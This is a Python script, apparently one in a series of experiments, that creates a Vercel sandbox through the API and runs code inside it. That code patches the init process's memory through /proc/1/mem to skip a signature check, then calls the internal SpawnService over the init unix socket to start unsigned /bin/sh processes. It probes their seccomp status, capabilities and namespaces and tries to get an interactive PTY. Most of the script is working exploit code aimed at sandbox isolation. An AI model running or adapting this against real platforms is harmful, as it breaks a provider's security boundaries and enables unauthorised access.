# -*- coding: utf-8 -*-
"""实验J287v: 免签Spawn进程权限对比(Seccomp/caps/ns) + Ping/SpawnInteractive方法面"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

NAME = "expj287v"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# cmd1: patch 免签 + Ping 无签名
out = run_cmd(sid, r'''
import os, socket, struct, json as _j
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77ba00, 5)
if old == bytes.fromhex("4c8d6424a8"):
    wa(0x77ba00, bytes.fromhex("31c031dbc3"))
    print("PATCHED", ra(0x77ba00, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)

# Ping 无签名 (协议探测)
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(6)
sock.connect("/run/vercel/share/init.sock")
msg = _j.dumps({}).encode()
body = b"\x00" + struct.pack(">I", len(msg)) + msg
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\r\nHost: init\r\n"
       b"Content-Type: application/connect+json\r\nConnect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
sock.sendall(req)
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 20000:
            break
except socket.timeout:
    pass
sock.close()
print("PING RAW:", repr(data[:800]), flush=True)
''', "PATCH_PING", timeout=100)
print("PATCH_PING out:", repr((out or "")[:1500]), flush=True)

# cmd2: 免签 Spawn 权限对比 (Seccomp/caps/ns/fd)
out = run_cmd(sid, r'''
import socket, struct, json as _j, base64, re
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(12)
sock.connect("/run/vercel/share/init.sock")
msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c",
    "echo ===SELF===; grep -E 'Seccomp|NoNewPrivs|CapEff|Uid:|Gid:' /proc/self/status; echo ===NS===; readlink /proc/self/ns/* | sort; echo ===FD===; ls -la /proc/self/fd | head -20; echo ===DONE==="],
    "environment": []}).encode()
body = b"\x00" + struct.pack(">I", len(msg)) + msg
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\nHost: init\r\n"
       b"Content-Type: application/connect+json\r\nConnect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
sock.sendall(req)
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 80000:
            break
except socket.timeout:
    pass
sock.close()
out_lines = []
for m in re.finditer(rb'"stdout":"([^"]+)"', data):
    try:
        out_lines.append(base64.b64decode(m.group(1)).decode("latin1", "replace"))
    except Exception:
        pass
print("".join(out_lines), flush=True)
print("===RAW HEAD===", flush=True)
print(data[:500].decode("latin1", "replace"), flush=True)
''', "SPAWN_PERM", timeout=100)
print("SPAWN_PERM out:", repr((out or "")[:4000]), flush=True)

# cmd3: SpawnInteractive 尝试 (PTY)
out = run_cmd(sid, r'''
import socket, struct, json as _j
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(8)
sock.connect("/run/vercel/share/init.sock")
msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "echo INT_OK; id"],
                "environment": [], "pty": {"rows": 24, "cols": 80, "term": "xterm"}}).encode()
body = b"\x00" + struct.pack(">I", len(msg)) + msg
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive HTTP/1.1\r\nHost: init\r\n"
       b"Content-Type: application/connect+json\r\nConnect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
sock.sendall(req)
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 30000:
            break
except socket.timeout:
    pass
sock.close()
print("INT RAW:", repr(data[:1500]), flush=True)
''', "SPAWN_INT", timeout=100)
print("SPAWN_INT out:", repr((out or "")[:2200]), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
